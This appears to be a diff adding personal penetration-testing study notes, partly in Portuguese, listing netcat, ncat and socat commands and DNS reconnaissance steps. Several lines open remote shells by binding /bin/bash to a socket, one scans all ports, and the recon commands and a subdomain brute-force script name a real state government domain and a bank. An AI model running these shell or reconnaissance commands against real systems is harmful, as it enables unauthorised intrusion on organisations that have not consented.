@@ -1,0 +1,65 @@
+service cron status
+cat /etc/crontab
+systemctl list-unit-files -t service
+-----------------NETCAT--------------------
+nc www.google.com 80
+nc -lvp 9000
+nc 127.0.0.1 9000
+nc -zv 127.0.0.1 1-65535
+nc -e /bin/bash 127.0.0.1 1024
+--------------------------
+---------------NCAT--------------
+apt install ncat
+ncat -lvp 3000 --ssl
+ncat 127.0.0.1 3000 -e /bin/bash
+-----------------
+---------------SOCAT-----------
+socat tcp4-listen:3000 -
+socat -dd tcp4-listen:3000 -
+socat tcp4:127.0.0.1:3000 -
+socat tcp4:127.0.0.1:3000 EXEC:/bin/bash
+socat file:`tty`,raw,echo=0 tcp-listen:3001
+socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:127.0.0.1:3001 (importante)
+socat -dd udp4-listen:3000
+-------------------------------
+-----------------theHarvester---------------
+theHarvester -d sefaz.rr.gov.br -b all
+theHarvester -d sefaz.rr.gov.br -l 100 -b all (max of the results)
+cat /etc/theHarvester/api-keys.yaml
+-----------------DNS--------------------
+www.SHODAN.io/
+www.search.CENSYS.io/
+dig @8.8.8.8 sefaz.rr.gov.br ANY (dig @<servidor dns> <dominio> <tipo da entrada>)
+whois sefaz.rr.gov.br
+dig -t MX sefaz.rr.gov.br
+dig -t NS sefaz.rr.gov.br
+dig -t ANY sefaz.rr.gov.br
+host sefaz.rr.gov.br
+-------dns_wordlist.txt-------------
+advanced
+mail
+admin
+mysql
+painel
+host
+--------------site.txt------------------
+google.com
+facebook.com
+bradesco.com.br
+youtube.com
+sefaz.rr.gov.br
+--------dns_scan.sh-----------------(script)
+for palavra in $(cat dns_wordlist.txt)
+    do
+    for site in $(cat site.txt)
+        do
+        host $palavra.$site
+    done
+        done
+--------------
+chmod +x dns_scan.sh
+./dns_scan.sh
+-----dnsenum-----
+dnsenum -f dns_wordlist sefaz.rr.gov.br
+https://github.com/rbsec/dnscan (WORDLIST)
+git clone https://github.com/rbsec/dnscan.git
